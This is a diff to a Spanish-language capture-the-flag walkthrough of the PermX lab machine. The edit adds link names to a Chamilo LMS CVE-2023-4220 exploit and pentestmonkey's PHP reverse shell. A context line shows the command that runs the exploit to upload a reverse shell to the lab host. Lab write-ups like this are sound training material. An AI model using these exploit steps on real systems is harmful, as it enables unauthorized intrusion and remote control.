@@ -66,11 +66,11 @@ Hemos añadido los nuevos subdominios a ``/etc/hosts`` y ahora procederemos a vi
 
 Mientras investigaba la versión de Chamilo y las vulnerabilidades recientes, encontré un exploit en GitHub con un POC (prueba de concepto) de ejecución de código remoto no autenticado.
 
-[](https://github.com/Ziad-Sakr/Chamilo-LMS-CVE-2023-4220-Exploit/tree/main)
+[CVE-2023-4220](https://github.com/Ziad-Sakr/Chamilo-LMS-CVE-2023-4220-Exploit/tree/main)
 
 Te recomiendo usar la revershell de pentestmonkey.
 
-[](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
+[Pentestmonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
 
 ```ruby
 ❯ bash CVE-2023-4220.sh -f rev.php -h http://lms.permx.htb/  -p 443
